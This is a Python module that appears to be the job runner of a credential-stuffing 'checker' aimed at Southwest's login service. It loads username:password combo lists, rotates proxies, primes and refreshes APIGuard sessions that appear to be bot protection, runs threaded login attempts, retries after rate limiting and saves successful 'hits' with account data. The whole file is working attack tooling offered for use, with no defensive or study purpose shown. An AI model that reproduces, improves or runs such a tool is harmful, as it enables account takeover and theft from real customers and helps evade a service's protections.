from __future__ import annotations

import random
import threading
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Iterable

from southwest_checker.checker import parse_combo
from southwest_checker.web_adapter import (
    _UNSET,
    check_account,
    evict_checker,
    get_job_settings,
    parse_proxy_lines,
    prewarm_apiguard,
    refresh_apiguard,
    reset_runtime_state,
)

from .combo_store import iter_nonempty_lines
from .db import FINAL_STATUSES, combo_key, get_checked_keys, insert_hit, mark_combo_checked

# node kernel bootstrap (45s) + login retries + HTTP
DEFAULT_CHECK_TIMEOUT = 90
PROGRESS_LOG_EVERY = 25


@dataclass
class JobStats:
    total: int = 0
    queued: int = 0
    skipped: int = 0
    checked: int = 0
    hits: int = 0
    bads: int = 0
    retries: int = 0
    errors: int = 0
    running: bool = False
    preparing: bool = False
    stop_requested: bool = False
    current: str = ""
    started_at: float | None = None
    logs: list[str] = field(default_factory=list)
    log_seq: int = 0


class CheckerWorker:
    def __init__(self) -> None:
        self._lock = threading.Lock()
        self._start_lock = threading.Lock()
        self._thread: threading.Thread | None = None
        self.stats = JobStats()

    def is_running(self) -> bool:
        with self._lock:
            return self.stats.running or self.stats.preparing

    def start(
        self,
        *,
        combo_lines: list[str] | None = None,
        combo_file: Path | None = None,
        proxies: list[str],
        threads: int = 5,
    ) -> dict[str, Any]:
        with self._start_lock:
            with self._lock:
                if self.stats.running or self.stats.preparing:
                    return {"ok": False, "error": "already_running"}

                if not combo_lines and (combo_file is None or not combo_file.exists()):
                    return {"ok": False, "error": "no_combos"}

                parsed_proxies, invalid_proxies = parse_proxy_lines(proxies)
                prep_logs = ["Preparing combo list..."]
                if invalid_proxies:
                    prep_logs.append(
                        f"Skipped {len(invalid_proxies)} invalid proxy line(s) — use host:port:user:pass"
                    )

                self.stats = JobStats(
                    running=True,
                    preparing=True,
                    logs=prep_logs,
                )

            reset_runtime_state()
            self._thread = threading.Thread(
                target=self._prepare_and_run,
                args=(combo_lines, combo_file, parsed_proxies, max(1, threads)),
                daemon=True,
            )
            self._thread.start()
            return {"ok": True, "status": "preparing"}

    def stop(self) -> None:
        with self._lock:
            self.stats.stop_requested = True

    def snapshot(self, since_log_seq: int = 0) -> dict[str, Any]:
        with self._lock:
            elapsed = 0.0
            cpm = 0.0
            if self.stats.started_at:
                elapsed = max(time.time() - self.stats.started_at, 0.001)
                cpm = (self.stats.checked / elapsed) * 60.0

            if since_log_seq > 0:
                offset = self.stats.log_seq - len(self.stats.logs)
                idx = max(0, since_log_seq - offset)
                new_logs = self.stats.logs[idx:]
            else:
                new_logs = list(self.stats.logs[-200:])

            return {
                "total": self.stats.total,
                "queued": self.stats.queued,
                "skipped": self.stats.skipped,
                "checked": self.stats.checked,
                "hits": self.stats.hits,
                "bads": self.stats.bads,
                "retries": self.stats.retries,
                "errors": self.stats.errors,
                "running": self.stats.running,
                "preparing": self.stats.preparing,
                "current": self.stats.current,
                "log_seq": self.stats.log_seq,
                "logs": new_logs,
                "cpm": round(cpm, 1),
                "elapsed_sec": round(elapsed, 1),
            }

    def _log(self, message: str) -> None:
        with self._lock:
            self.stats.logs.append(message)
            self.stats.log_seq += 1
            if len(self.stats.logs) > 2000:
                self.stats.logs = self.stats.logs[-2000:]

    def _iter_combo_lines(
        self,
        combo_lines: list[str] | None,
        combo_file: Path | None,
    ) -> Iterable[str]:
        if combo_lines is not None:
            return combo_lines
        if combo_file is not None:
            return iter_nonempty_lines(combo_file)
        return []

    def _prepare_and_run(
        self,
        combo_lines: list[str] | None,
        combo_file: Path | None,
        proxies: list[str],
        threads: int,
    ) -> None:
        try:
            checked_keys = get_checked_keys()
            parsed_combos: list[tuple[str, str]] = []
            seen_keys: set[str] = set()
            raw_count = 0

            for line in self._iter_combo_lines(combo_lines, combo_file):
                with self._lock:
                    if self.stats.stop_requested:
                        return

                raw_count += 1
                if raw_count % 10000 == 0:
                    self._log(f"Parsed {raw_count:,} lines...")

                parsed = parse_combo(line)
                if not parsed:
                    continue
                username, password = parsed
                key = combo_key(username, password)
                if key in seen_keys:
                    continue
                seen_keys.add(key)
                parsed_combos.append(parsed)

            to_run: list[tuple[str, str]] = []
            skipped = 0
            for username, password in parsed_combos:
                key = combo_key(username, password)
                if key in checked_keys:
                    skipped += 1
                else:
                    to_run.append((username, password))

            with self._lock:
                self.stats.total = len(parsed_combos)
                self.stats.queued = len(to_run)
                self.stats.skipped = skipped
                self.stats.preparing = False

            if skipped:
                self._log(f"Resuming — skipped {skipped:,} already-checked combo(s)")

            if not parsed_combos:
                with self._lock:
                    self.stats.running = False
                self._log("No valid combos found")
                return

            if not to_run:
                with self._lock:
                    self.stats.running = False
                self._log("All combos already checked — nothing to do")
                return

            self._log("Bootstrapping APIGuard session(s)...")
            try:
                prewarm_apiguard(proxies)
                self._log("APIGuard ready")
            except Exception as exc:
                self._log(f"WARNING | APIGuard bootstrap failed: {exc}")

            with self._lock:
                self.stats.started_at = time.time()

            self._log(f"Starting — {len(to_run):,} combo(s) queued · {threads} threads")
            self._run(to_run, proxies, threads)
        except Exception as exc:
            with self._lock:
                self.stats.preparing = False
                self.stats.running = False
            self._log(f"ERROR | job prep failed | {exc}")

    def _pick_proxy(self, proxies: list[str], index: int) -> str | None:
        if not proxies:
            return None
        if len(proxies) == 1:
            return proxies[0]
        return proxies[index % len(proxies)]

    def _record_result(
        self,
        username: str,
        password: str,
        result,
        retry_queue: list[tuple[str, str]],
    ) -> None:
        status = result.status.lower()

        if result.status == "RETRY":
            retry_queue.append((username, password))
            with self._lock:
                self.stats.retries += 1
            self._log(result.format_line())
            return

        with self._lock:
            self.stats.checked += 1
            checked = self.stats.checked

        if status in FINAL_STATUSES:
            mark_combo_checked(username, password, status)

        if result.status == "HIT":
            line = result.format_line()
            hit_id = insert_hit(line, username, password, result.to_data())
            with self._lock:
                self.stats.hits += 1
            self._log(line)
            if hit_id is None:
                self._log(f"DUPLICATE HIT | {username}")
        elif result.status == "BAD":
            with self._lock:
                self.stats.bads += 1
                count = self.stats.bads
            if count <= 5 or count % 25 == 0:
                self._log(result.format_line())
        else:
            with self._lock:
                self.stats.errors += 1
            self._log(result.format_line())

        if checked % PROGRESS_LOG_EVERY == 0:
            with self._lock:
                self._log(
                    f"Progress — {self.stats.checked:,} checked · "
                    f"{self.stats.hits} hits · {self.stats.bads} bad · "
                    f"{self.stats.errors} err"
                )

    def _run(
        self,
        combos: list[tuple[str, str]],
        proxies: list[str],
        threads: int,
    ) -> None:
        from concurrent.futures import FIRST_COMPLETED, ThreadPoolExecutor, TimeoutError as FuturesTimeoutError, wait

        settings = get_job_settings()
        check_timeout = DEFAULT_CHECK_TIMEOUT if settings.full_bootstrap else 60

        pending = list(combos)
        retry_queue: list[tuple[str, str]] = []
        retry_round = 0
        max_retry_rounds = 2

        while pending:
            with self._lock:
                if self.stats.stop_requested:
                    break

            combo_iter = iter(enumerate(pending))
            inflight: dict = {}
            max_inflight = threads

            def task(idx: int, username: str, password: str):
                with self._lock:
                    if self.stats.stop_requested:
                        return None
                    self.stats.current = username

                proxy = self._pick_proxy(proxies, idx) if proxies else _UNSET
                return check_account(
                    username, password, proxy=proxy, timeout=check_timeout
                )

            def submit_next(pool) -> bool:
                with self._lock:
                    if self.stats.stop_requested:
                        return False
                try:
                    idx, (username, password) = next(combo_iter)
                except StopIteration:
                    return False
                future = pool.submit(task, idx, username, password)
                inflight[future] = (username, password, idx)
                return True

            try:
                with ThreadPoolExecutor(max_workers=threads) as pool:
                    for _ in range(min(max_inflight, len(pending))):
                        if not submit_next(pool):
                            break

                    while inflight:
                        done, _ = wait(inflight, return_when=FIRST_COMPLETED)
                        for future in done:
                            username, password, idx = inflight.pop(future)
                            proxy = (
                                self._pick_proxy(proxies, idx) if proxies else None
                            )
                            try:
                                result = future.result(timeout=check_timeout + 15)
                            except FuturesTimeoutError:
                                evict_checker(proxy)
                                with self._lock:
                                    self.stats.checked += 1
                                    self.stats.errors += 1
                                self._log(
                                    f"ERROR | {username} | "
                                    f"worker timed out after {check_timeout + 15}s"
                                )
                            except Exception as exc:
                                with self._lock:
                                    self.stats.checked += 1
                                    self.stats.errors += 1
                                self._log(f"ERROR | {username} | {exc}")
                            else:
                                if result is not None:
                                    self._record_result(
                                        username, password, result, retry_queue
                                    )

                            submit_next(pool)

                        with self._lock:
                            if self.stats.stop_requested:
                                for pending_future in inflight:
                                    pending_future.cancel()
                                inflight.clear()
                                break
            except Exception as exc:
                self._log(f"ERROR | worker pool failed | {exc}")

            if not retry_queue or retry_round >= max_retry_rounds:
                break

            retry_round += 1
            pending = retry_queue
            retry_queue = []
            self._log(
                f"Retry round {retry_round}/{max_retry_rounds} — "
                f"{len(pending):,} combo(s) after 429/backoff"
            )
            try:
                refresh_apiguard()
            except Exception as exc:
                self._log(f"WARNING | APIGuard refresh failed: {exc}")
            time.sleep(min(3.0 * retry_round, 10.0))

        with self._lock:
            self.stats.running = False
            self.stats.preparing = False
            self.stats.stop_requested = False
            self.stats.current = ""
        if retry_queue:
            self._log(
                f"Stopped with {len(retry_queue):,} retry combo(s) left — "
                "run again to continue"
            )
        self._log("Job finished")


worker = CheckerWorker()
